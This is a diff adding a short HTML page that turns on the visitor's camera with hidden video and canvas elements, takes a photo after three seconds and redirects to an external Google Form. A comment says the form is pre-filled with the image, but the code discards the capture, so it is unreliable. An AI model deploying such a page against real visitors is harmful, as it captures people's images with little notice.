@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Capture and Upload Photo</title>
+</head>
+<body>
+  <h1>Capturing Photo...</h1>
+  <video id="video" autoplay style="display:none;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    let imageData;
+
+    // Access the camera and capture after a few seconds
+    navigator.mediaDevices.getUserMedia({ video: true }).then((stream) => {
+      video.srcObject = stream;
+      
+      // After 3 seconds, capture the image
+      setTimeout(() => {
+        const context = canvas.getContext('2d');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        imageData = canvas.toDataURL('image/png');
+        
+        // Redirect to the form with pre-filled image
+        const formUrl = 'https://forms.gle/1JemZXpk7PiPttA27';
+        window.location.href = formUrl;
+      }, 3000);  // Adjust this delay as needed
+    });
+  </script>
+</body>
+</html>
